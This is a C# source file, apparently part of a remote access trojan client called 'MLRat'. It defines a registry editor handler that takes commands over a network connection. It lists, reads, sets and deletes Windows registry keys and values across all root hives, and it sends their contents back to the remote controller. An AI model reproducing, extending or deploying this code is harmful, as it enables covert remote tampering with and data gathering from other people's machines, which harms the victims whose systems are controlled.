using Microsoft.Win32;
using MLRat.Client;
using SharedCode.Network;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace MLManagementClient.Handlers
{
    public static class RegistryEditorHandler
    {
        private static IClientHost NetworkHost = null;

        public static void SetNetworkHost(IClientHost _connection)
        {
            NetworkHost = _connection;
        }

        public static void Handle(object[] data)
        {
            RegistryCommand command = (RegistryCommand)data[1];

            Console.WriteLine("Registry Command: {0}", command.ToString());


            if(command == RegistryCommand.DeleteValue)
            {
                try
                {
                    RegistryKey key = KeyFromType((RegistryKeyType)data[2]);
                    if (key == null) return;
                    string path = (string)data[3];
                    key.OpenSubKey(path, true).DeleteValue((string)data[4]);
                }
                catch (Exception ex)
                {
                    if (ex is UnauthorizedAccessException || ex is System.Security.SecurityException)
                        throw;
                    else
                        throw;
                }
            }

            if(command == RegistryCommand.SetValue)
            {
                try
                {
                    RegistryKey key = KeyFromType((RegistryKeyType)data[2]);
                    if (key == null) return;
                    string path = (string)data[3];
                    key.OpenSubKey(path, true).SetValue((string)data[4], (string)data[5]);
                }
                catch (Exception ex)
                {
                    if (ex is UnauthorizedAccessException || ex is System.Security.SecurityException)
                        throw;
                    else
                        throw;
                }
            }


            if(command == RegistryCommand.UpdateNodes)
            {
                try
                {
                    RegistryKey key = KeyFromType((RegistryKeyType)data[2]);
                    if (key == null) return;
                    string path = (string)data[3];
                    string[] subKeys = key.OpenSubKey(path).GetSubKeyNames();
                    if (subKeys.Length > 0)
                        NetworkHost.Send((byte)NetworkCommand.RegistryEdit, (byte)RegistryCommand.UpdateNodeResponce, subKeys);
                    else
                        NetworkHost.Send((byte)NetworkCommand.RegistryEdit, (byte)RegistryCommand.EmptyNode);
                }
                catch
                {
                    NetworkHost.Send((byte)NetworkCommand.RegistryEdit, (byte)RegistryCommand.NodeDeniedAccess);
                }
            }

            if(command == RegistryCommand.UpdateKeys)
            {
                try
                {
                    RegistryKey key = KeyFromType((RegistryKeyType)data[2]);
                    if (key == null) return;
                    string path = (string)data[3];
                    RegistryKey registrySubkey = key.OpenSubKey(path);
                    string[] values = registrySubkey.GetValueNames();
                    Dictionary<string, string> valueDic = new Dictionary<string, string>();
                    foreach (string s in values)
                    {
                        if (!valueDic.ContainsKey(s))
                        {
                            valueDic.Add(s, registrySubkey.GetValue(s).ToString());
                        }
                    }
                    NetworkHost.Send((byte)NetworkCommand.RegistryEdit, (byte)RegistryCommand.ValueResponce, valueDic);
                }
                catch
                {
                    NetworkHost.Send((byte)NetworkCommand.RegistryEdit, (byte)RegistryCommand.ValueDeniedAccess);
                }
            }


        }

        private static RegistryKey KeyFromType(RegistryKeyType type)
        {
            switch(type)
            {
                case RegistryKeyType.CurrentUser: return Registry.CurrentUser;
                case RegistryKeyType.LocalMachine: return Registry.LocalMachine;
                case RegistryKeyType.ClassesRoot: return Registry.ClassesRoot;
                case RegistryKeyType.UserRoot: return Registry.Users;
                case RegistryKeyType.CurrentConfig: return Registry.CurrentConfig;
                default: return null;
            }
        }

    }
}
